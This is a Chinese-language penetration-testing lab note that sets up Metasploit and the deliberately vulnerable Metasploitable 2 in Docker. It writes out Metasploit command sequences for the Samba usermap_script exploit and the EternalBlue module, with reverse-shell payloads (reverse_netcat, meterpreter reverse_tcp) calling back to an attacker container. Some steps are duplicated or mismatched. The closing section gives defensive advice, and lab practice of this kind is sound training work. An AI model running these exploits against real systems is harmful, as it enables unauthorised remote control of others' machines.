# [Topic]系統攻擊
  * Docker Image- Metasploit
  * 使用Docker與Metasploit，針對脆弱的Ubuntu服務進行模擬攻擊，並取得控制權限。

# [Abstract]緣起摘要
  * Metasploit是一款強大的滲透測試工具，可用於發現漏洞並進行攻擊模擬。
  * 透過Docker，我們可以快速部署Metasploit，而無需在本機安裝大量依賴。

# [Relational]相關資訊
  * 目標：Metasploitable 2（內含多個已知漏洞的Linux測試環境）
  * 攻擊者：Metasploit（使用Docker來執行）
  * 攻擊方式：利用Samba漏洞取得遠端shell權限（CVE-2007-2447）

# [Procedure]步驟紀錄
  * [連結名稱](https://google.com "Metaspoilt with Docker")

# [Suggestion]結論建議
  * 透過Docker快速部署Metasploit環境，並利用Samba漏洞取得遠端控制權限。滲透測試的基本流程，包括：偵查、漏洞分析與攻擊。
  * 安全防護：避免使用舊版的服務，並定期更新系統。
  * 防禦措施：設定防火牆規則，阻擋來自外部的445連線，並監控異常行為。
  * 進一步學習：嘗試使用Metasploit測試其他漏洞，提升滲透測試技能。


# 1. Preparation
## Use Docker to run Metasploit

### Check Docker status
`docker --version`

# 2. Build attack target
### Download Metasploit2 
`docker pull tleemcjr/metasploitable2`

### Run Metasploit2 in Docker
`docker run -d --name vulnerable -p 445:445 -p 21:21 -p 22:22 -p 80:80 tleemcjr/metasploitable2`
docker run -d --name vulnerable -p 445:445 -p 21:21 -p 22:22 -p 80:80 tleemcjr/metasploitable2 bash -c "/bin/services.sh && tail -f /dev/null"

docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' vulnerable  # get Target IP


- -p 445:445：開放 SMB（檔案共享漏洞）
- -p 21:21：開放 FTP（容易被暴力破解）
- -p 22:22：開放 SSH（可能存在弱密碼）
- -p 80:80：開放 Web 服務（可能存在漏洞）

### Check Metasploit2 in Docker status
`docker ps`
docker rm -f vulnerable  # if docker exist, delete it.
docker start vulnerable


# 3. Run attacker
### Run Metasploit in Docker
`docker run --rm -it metasploitframework/metasploit-framework  # delete when exit docker`

`docker run -it --name metasploit metasploitframework/metasploit-framework  # keep docker container`
`docker start -ai metasploit  # run docker with next time`
`help  # check metasploit status`

# 4. Scan target system
use exploit/multi/samba/usermap_script


msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 172.17.0.2
msf6 auxiliary(scanner/smb/smb_version) > run

## exploit
use exploit/multi/samba/usermap_script
set RHOSTS 172.17.0.2
check
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 172.17.0.3
exploit



msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 172.17.0.2
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOAD cmd/unix/reverse_netcat

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 172.17.0.3
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit




